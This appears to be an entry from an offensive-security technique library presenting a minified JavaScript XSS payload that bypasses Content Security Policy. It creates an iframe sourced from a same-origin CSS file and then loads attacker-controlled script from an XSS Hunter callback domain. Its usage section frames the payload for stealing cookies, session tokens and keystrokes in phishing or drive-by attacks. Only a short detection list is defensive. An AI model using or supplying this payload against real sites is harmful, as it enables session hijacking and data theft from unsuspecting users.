---
type: code
language: js
verified: true
created_at: '2023-04-06T03:56:43.239195+00:00'
updated_at: '2023-04-10T20:21:38.853251+00:00'
tags:
  - csp-bypass
  - xss
  - payload
platforms:
  - Web
validated: true
---

# JavaScript-CSP-Bypass-Using-Iframe-and-Timeout

## Code

```js
// CSP Bypass with Inline and Eval
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

## Description

This JavaScript code snippet bypasses CSP restrictions on inline scripts by creating an invisible iframe that sources a same-origin CSS file, which has a more permissive policy allowing inline execution. It then appends an external script to the iframe's head after a short delay, enabling the load of attacker-controlled JavaScript for XSS exploitation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| [YOUR_XSSHUNTER_USERNAME] | Username for the XSS hunter service endpoint (e.g., xss.ht) to receive callbacks | attackerxss |

## Usage

Inject this minified code into an XSS vulnerability on a CSP-protected page, such as a reflected parameter or stored input. Ensure the page loads a CSS file. The code runs entirely client-side in the browser, executing the external script in the iframe context to evade parent's CSP. Ideal for capturing cookies, session tokens, or keystrokes in phishing or drive-by attacks.

## Detection

- Browser CSP reporting endpoints receive violation attempts for inline script creation.
- Network logs show requests to CSS files followed by external script loads from suspicious domains like xss.ht.
- DOM inspection reveals unexpected iframes sourcing CSS or appended scripts in head.
- JavaScript anomaly detection tools flag dynamic iframe and setTimeout usage patterns.

## Related

- [[procedures/CSP-Bypass-Using-Inline-Scripts-and-Eval]]
